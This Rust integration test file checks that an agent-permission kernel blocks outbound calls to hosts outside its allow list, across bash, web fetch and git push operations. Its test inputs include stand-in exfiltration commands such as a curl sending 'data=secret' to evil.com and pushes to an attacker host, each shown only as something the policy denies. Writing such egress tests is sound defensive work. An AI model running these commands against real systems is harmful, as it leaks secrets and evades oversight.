#![allow(deprecated)]
//! Egress policy integration tests — extracted from kernel.rs (#825).
//!
//! These tests verify that the kernel correctly enforces egress policies
//! (host allow/deny lists) across different operation types.

use portcullis::egress_policy::EgressPolicy;
use portcullis::kernel::{DenyReason, Kernel, Verdict};
use portcullis::{CommandLattice, Operation, PermissionLattice};

/// Build a kernel that has all capabilities enabled and no command
/// restrictions — isolating just the egress policy check.
///
/// Pre-grants approvals for all egress-capable operations so the
/// uninhabitable_state constraint doesn't interfere with egress policy tests.
fn kernel_with_egress(toml: &str) -> Kernel {
    let policy = EgressPolicy::from_toml(toml).unwrap();
    let mut perms = PermissionLattice::permissive();
    perms.commands = CommandLattice::permissive();
    let mut kernel = Kernel::new(perms);
    kernel.set_egress_policy(policy);
    // Pre-grant approvals so uninhabitable_state gating doesn't mask egress denials
    kernel.grant_approval(Operation::RunBash, 100);
    kernel.grant_approval(Operation::GitPush, 100);
    kernel.grant_approval(Operation::CreatePr, 100);
    kernel.grant_approval(Operation::WebFetch, 100);
    kernel.grant_approval(Operation::WebSearch, 100);
    kernel.grant_approval(Operation::SpawnAgent, 100);
    kernel
}

#[test]
fn bash_curl_to_denied_host_is_blocked() {
    let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com", "crates.io"]"#);
    let (d, token) = kernel.decide(
        Operation::RunBash,
        "curl https://evil.com/exfil?data=secret",
    );
    assert!(d.verdict.is_denied(), "expected deny, got {:?}", d.verdict);
    assert!(token.is_none());
    match &d.verdict {
        Verdict::Deny(DenyReason::EgressBlocked {
            host,
            policy_reason,
        }) => {
            assert_eq!(host, "evil.com");
            assert!(policy_reason.contains("evil.com"));
            assert!(policy_reason.contains("allowed hosts:"));
        }
        other => panic!("expected EgressBlocked, got {other:?}"),
    }
}

#[test]
fn bash_curl_to_allowed_host_passes() {
    let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com", "crates.io"]"#);
    let (d, token) = kernel.decide(Operation::RunBash, "curl https://api.github.com/repos");
    assert!(
        d.verdict.is_allowed(),
        "expected allow, got {:?}",
        d.verdict
    );
    assert!(token.is_some());
}

#[test]
fn bash_safe_command_no_egress_passes() {
    let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com"]"#);
    let (d, _) = kernel.decide(Operation::RunBash, "cargo test --lib");
    assert!(
        d.verdict.is_allowed(),
        "safe command should pass, got {:?}",
        d.verdict
    );
}

#[test]
fn web_fetch_denied_host() {
    let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com"]"#);
    let (d, _) = kernel.decide(Operation::WebFetch, "https://evil.com/data");
    assert!(d.verdict.is_denied());
    match &d.verdict {
        Verdict::Deny(DenyReason::EgressBlocked { host, .. }) => {
            assert_eq!(host, "evil.com");
        }
        other => panic!("expected EgressBlocked, got {other:?}"),
    }
}

#[test]
fn web_fetch_allowed_host() {
    let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com"]"#);
    let (d, token) = kernel.decide(Operation::WebFetch, "https://api.github.com/repos");
    assert!(d.verdict.is_allowed());
    assert!(token.is_some());
}

#[test]
fn git_push_denied_host() {
    let mut kernel = kernel_with_egress(r#"allowed_hosts = ["github.com"]"#);
    let (d, _) = kernel.decide(Operation::GitPush, "https://evil.com/org/repo.git");
    assert!(d.verdict.is_denied());
    match &d.verdict {
        Verdict::Deny(DenyReason::EgressBlocked { host, .. }) => {
            assert_eq!(host, "evil.com");
        }
        other => panic!("expected EgressBlocked, got {other:?}"),
    }
}

#[test]
fn git_push_allowed_host() {
    let mut kernel = kernel_with_egress(r#"allowed_hosts = ["github.com"]"#);
    let (d, token) = kernel.decide(Operation::GitPush, "https://github.com/org/repo.git");
    assert!(d.verdict.is_allowed());
    assert!(token.is_some());
}

#[test]
fn git_push_ssh_format_denied() {
    let mut kernel = kernel_with_egress(r#"allowed_hosts = ["github.com"]"#);
    let (d, _) = kernel.decide(Operation::GitPush, "git@evil.com:org/repo.git");
    assert!(d.verdict.is_denied());
    match &d.verdict {
        Verdict::Deny(DenyReason::EgressBlocked { host, .. }) => {
            assert_eq!(host, "evil.com");
        }
        other => panic!("expected EgressBlocked, got {other:?}"),
    }
}

#[test]
fn deny_list_overrides_wildcard_allow() {
    let mut kernel = kernel_with_egress(
        r#"
allowed_hosts = ["*.github.com"]
denied_hosts = ["evil.github.com"]
"#,
    );
    // evil.github.com matches allow wildcard but deny takes priority
    let (d, _) = kernel.decide(Operation::WebFetch, "https://evil.github.com/exfil");
    assert!(d.verdict.is_denied());

    // good.github.com is fine
    let (d2, _) = kernel.decide(Operation::WebFetch, "https://good.github.com/data");
    assert!(d2.verdict.is_allowed());
}

#[test]
fn no_egress_policy_allows_all() {
    let mut perms = PermissionLattice::permissive();
    perms.commands = CommandLattice::permissive();
    let mut kernel = Kernel::new(perms);
    kernel.grant_approval(Operation::WebFetch, 10);
    // No egress policy set — should allow any host
    let (d, _) = kernel.decide(Operation::WebFetch, "https://anything.com/data");
    assert!(d.verdict.is_allowed());
}

#[test]
fn read_files_not_affected_by_egress() {
    let mut kernel = kernel_with_egress(r#"allowed_hosts = []"#);
    // Empty allowlist means all egress denied, but reads aren't egress
    let (d, _) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
    assert!(d.verdict.is_allowed());
}

#[test]
fn bash_multiple_destinations_first_blocked() {
    let mut kernel = kernel_with_egress(r#"allowed_hosts = ["b.com"]"#);
    // Two destinations: a.com (blocked) then b.com (allowed)
    let (d, _) = kernel.decide(Operation::RunBash, "curl https://a.com; curl https://b.com");
    assert!(
        d.verdict.is_denied(),
        "first blocked host should deny the whole command"
    );
    match &d.verdict {
        Verdict::Deny(DenyReason::EgressBlocked { host, .. }) => {
            assert_eq!(host, "a.com");
        }
        other => panic!("expected EgressBlocked for a.com, got {other:?}"),
    }
}

#[test]
fn egress_blocked_recorded_in_trace() {
    let mut kernel = kernel_with_egress(r#"allowed_hosts = ["safe.com"]"#);
    let trace_before = kernel.trace().len();
    let _ = kernel.decide(Operation::WebFetch, "https://evil.com/data");
    assert_eq!(kernel.trace().len(), trace_before + 1);
    let entry = kernel.trace().last().unwrap();
    assert!(entry.verdict.is_denied());
}
